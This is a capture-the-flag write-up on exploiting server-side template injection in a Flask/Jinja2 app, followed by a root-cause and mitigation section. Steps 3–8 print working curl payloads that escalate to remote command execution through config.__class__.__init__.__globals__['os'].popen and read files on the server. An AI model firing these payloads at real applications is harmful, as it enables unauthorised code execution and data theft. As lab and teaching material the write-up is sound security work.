# SSTI Challenge Writeup

**Challenge:** SSTI (Web Security / Machine Control)
**Target:** `ctf-akshay-ssti-e9c8b280.challenges.pentestgarage.com:80`
**Flag:** `ctf{s3rv34_s!d3_t3mpl4t3_inj3ct!on}`

## Summary

A Flask web app takes a `name` parameter via `POST /say_hello` and renders it directly into a Jinja2 template without sanitization. This allows Server-Side Template Injection (SSTI), which is escalated to full remote code execution (RCE) and used to read a flag file from the filesystem.

## Steps

### 1. Recon

The homepage serves a simple form that POSTs a `name` field to `/say_hello`:

```html
<form action="/say_hello" method="POST">
    <input type="text" name="name">
</form>
```

### 2. Confirm reflection

```bash
curl -X POST http://<target>/say_hello -d "name=Akshay"
# -> <h1> Hello, Akshay </h1>
```

### 3. Confirm SSTI

```bash
curl -X POST http://<target>/say_hello -d "name={{7*7}}"
# -> <h1> Hello, 49 </h1>
```

The expression was evaluated instead of reflected literally, confirming template injection.

### 4. Fingerprint the template engine

```bash
curl -X POST http://<target>/say_hello --data-urlencode "name={{7*'7'}}"
# -> <h1> Hello, 7777777 </h1>
```

`7777777` (Python string repetition) rather than `49` confirms **Jinja2 (Python/Flask)**.

### 5. Confirm object access is unfiltered

```bash
curl -X POST http://<target>/say_hello --data-urlencode "name={{config}}"
```

Returned the full Flask `Config` object — no filtering on `{{ }}`, dots, or underscores.

### 6. Escalate to RCE

Rather than counting indexes in `''.__class__.__mro__[1].__subclasses__()` to find `subprocess.Popen`, pivot through the `Config` object's class to reach the `os` module directly via `__globals__`:

```bash
curl -X POST http://<target>/say_hello \
  --data-urlencode "name={{ config.__class__.__init__.__globals__['os'].popen('id').read() }}"
# -> uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
```

**Why this works:**
- `config` → instance of Flask's `Config` class
- `config.__class__` → the `Config` class itself
- `.__init__.__globals__` → the global namespace of the module `Config` is defined in (which imports `os` at the top)
- `['os']` → grabs the live `os` module object
- `.popen(cmd).read()` → executes a shell command and returns output

This avoids brittle subclass-index enumeration and works reliably across Flask apps.

### 7. Locate the flag

```bash
curl -X POST http://<target>/say_hello \
  --data-urlencode "name={{ config.__class__.__init__.__globals__['os'].popen('find / -iname \"*flag*\" 2>/dev/null').read() }}"
```

Found: `/usr/src/app/flag.txt`

### 8. Read the flag

```bash
curl -X POST http://<target>/say_hello \
  --data-urlencode "name={{ config.__class__.__init__.__globals__['os'].popen('cat /usr/src/app/flag.txt').read() }}"
# -> ctf{s3rv34_s!d3_t3mpl4t3_inj3ct!on}
```

## Root Cause & Fix

The app likely renders user input with something like:

```python
render_template_string(f"<h1> Hello, {name} </h1>")
```

instead of passing `name` as template *data*:

```python
render_template_string("<h1> Hello, {{ name }} </h1>", name=name)
```

Concatenating untrusted input into the template *source* lets the engine parse and execute it as template syntax. Passing it as a variable makes Jinja2 auto-escape and treat it as plain text.

**Mitigations:**
- Never build template strings via string concatenation/f-strings with user input.
- Pass user data as render context variables, not template source.
- If a sandboxed environment is required, use Jinja2's `SandboxedEnvironment` (though sandbox escapes are a known, non-trivial risk).
- Apply least-privilege to the app's runtime user/container to limit blast radius of any RCE.

## Tools Used

- `curl` for crafting POST requests
- Manual Jinja2 SSTI payloads
